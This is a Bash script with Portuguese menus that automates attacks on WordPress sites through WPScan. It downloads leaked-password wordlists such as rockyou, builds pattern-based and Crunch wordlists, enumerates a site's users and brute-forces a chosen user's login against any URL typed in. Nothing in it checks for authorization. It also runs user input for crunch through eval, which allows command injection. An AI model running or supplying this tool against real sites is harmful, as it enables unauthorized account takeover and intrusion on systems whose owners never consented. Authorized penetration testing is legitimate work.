#!/bin/bash

# WPScan Tool + Multiple Wordlists + Custom + Crunch Full Support

# === CONFIGURAÇÕES ===
WORDLISTS=(
    "/tmp/rockyou.txt"
    "/tmp/darkc0de.lst"
    "/tmp/10k_most_common.txt"
)
NAMES=("rockyou.txt" "darkc0de.lst" "10k_most_common.txt")
URLS=(
    "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/darkc0de.lst"
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt"
)
GENERATED_WORDLIST="/tmp/generated_wordlist.txt"
CRUNCH_WORDLIST="/tmp/crunch_custom.txt"

# === CORES ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# === FUNÇÕES ===

function check_dependencies() {
    for cmd in wpscan crunch wget; do
        if ! command -v $cmd &>/dev/null; then
            echo -e "${YELLOW}[*] Instalando dependência: $cmd...${NC}"
            sudo apt update && sudo apt install -y $cmd
            if ! command -v $cmd &>/dev/null; then
                echo -e "${RED}Erro: Falha ao instalar $cmd. Saindo.${NC}"
                exit 1
            fi
        fi
    done
}

function download_wordlists() {
    for i in "${!WORDLISTS[@]}"; do
        if [ ! -f "${WORDLISTS[$i]}" ]; then
            echo -e "${CYAN}Baixando ${NAMES[$i]}...${NC}"
            wget -q "${URLS[$i]}" -O "${WORDLISTS[$i]}"
            if [ $? -ne 0 ]; then
                echo -e "${RED}Erro ao baixar ${NAMES[$i]}${NC}"
            fi
        fi
    done
}

function print_menu() {
    echo -e "${CYAN}=============================="
    echo "     WPScan Tool Menu"
    echo -e "==============================${NC}"
    echo ""
    echo "1) Checar se o site é WordPress"
    echo "2) Enumerar usuários"
    echo "3) Brute-force login com wordlist"
    echo "4) Gerar nova wordlist com padrões"
    echo "5) Gerar wordlist customizada com Crunch"
    echo "6) Sair"
}

function brute_force_menu() {
    read -p "Usuário para atacar: " USERNAME
    echo "Escolha uma wordlist:"
    for i in "${!NAMES[@]}"; do
        echo "$((i+1))) ${NAMES[$i]}"
    done
    echo "$(( ${#NAMES[@]} + 1 ))) Wordlist personalizada"
    echo "$(( ${#NAMES[@]} + 2 ))) Wordlist gerada (base+padrão)"
    echo "$(( ${#NAMES[@]} + 3 ))) Wordlist Crunch customizada"
    read -p "Opção [1-$(( ${#NAMES[@]} + 3 ))]: " WORDLIST_OPTION

    case $WORDLIST_OPTION in
        [1-3])
            CHOSEN_WORDLIST="${WORDLISTS[$((WORDLIST_OPTION-1))]}"
            ;;
        $(( ${#NAMES[@]} + 1 )))
            read -p "Caminho completo da sua wordlist: " CUSTOM_PATH
            if [[ -f "$CUSTOM_PATH" ]]; then
                CHOSEN_WORDLIST="$CUSTOM_PATH"
            else
                echo -e "${RED}Arquivo não encontrado.${NC}"
                return
            fi
            ;;
        $(( ${#NAMES[@]} + 2 )))
            if [[ -f "$GENERATED_WORDLIST" ]]; then
                CHOSEN_WORDLIST="$GENERATED_WORDLIST"
            else
                echo -e "${RED}Nenhuma wordlist gerada encontrada.${NC}"
                return
            fi
            ;;
        $(( ${#NAMES[@]} + 3 )))
            if [[ -f "$CRUNCH_WORDLIST" ]]; then
                CHOSEN_WORDLIST="$CRUNCH_WORDLIST"
            else
                echo -e "${RED}Nenhuma wordlist Crunch gerada.${NC}"
                return
            fi
            ;;
        *)
            echo -e "${RED}Seleção inválida.${NC}"
            return
            ;;
    esac

    echo -e "${YELLOW}Iniciando ataque...${NC}"
    wpscan --url "$TARGET" --usernames "$USERNAME" --passwords "$CHOSEN_WORDLIST"
}

function generate_pattern_wordlist() {
    read -p "Caminho da wordlist base: " BASE_PATH
    if [[ ! -f "$BASE_PATH" ]]; then
        echo -e "${RED}Arquivo não encontrado: $BASE_PATH${NC}"
        return
    fi

    echo -e "${YELLOW}Gerando wordlist com padrões...${NC}"
    > "$GENERATED_WORDLIST"
    while read -r word; do
        echo "$word" >> "$GENERATED_WORDLIST"
        echo "${word}123" >> "$GENERATED_WORDLIST"
        echo "${word}2024" >> "$GENERATED_WORDLIST"
        echo "${word}!" >> "$GENERATED_WORDLIST"
        echo "$(tr '[:lower:]' '[:upper:]' <<< ${word})" >> "$GENERATED_WORDLIST"
    done < "$BASE_PATH"
    echo -e "${GREEN}✅ Salvo em: $GENERATED_WORDLIST${NC}"
}

function generate_crunch_wordlist() {
    echo -e "${CYAN}Sintaxe Crunch (ex: crunch 6 6 abc123 -t @@2024@@)"
    echo "Digite o comando crunch SEM o argumento -o."
    echo "Exemplo: crunch 6 6 -t @@2024@@ -f /usr/share/crunch/charset.lst mixalpha-numeric${NC}"
    read -p "crunch " CRUNCH_ARGS

    echo -e "${YELLOW}Gerando com: crunch $CRUNCH_ARGS -o $CRUNCH_WORDLIST${NC}"
    eval crunch $CRUNCH_ARGS -o "$CRUNCH_WORDLIST"

    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}✅ Wordlist Crunch salva em: $CRUNCH_WORDLIST${NC}"
    else
        echo -e "${RED}❌ Falha no Crunch. Verifique a sintaxe.${NC}"
    fi
}

# === INÍCIO DO SCRIPT ===

check_dependencies
download_wordlists

echo ""
read -p "URL alvo (ex: https://exemplo.com): " TARGET

while true; do
    print_menu
    read -p "Opção: " OPTION
    case $OPTION in
        1)
            wpscan --url "$TARGET"
            ;;
        2)
            wpscan --url "$TARGET" --enumerate u
            ;;
        3)
            brute_force_menu
            ;;
        4)
            generate_pattern_wordlist
            ;;
        5)
            generate_crunch_wordlist
            ;;
        6)
            echo -e "${GREEN}Até logo!${NC}"
            break
            ;;
        *)
            echo -e "${RED}Opção inválida.${NC}"
            ;;
    esac
done
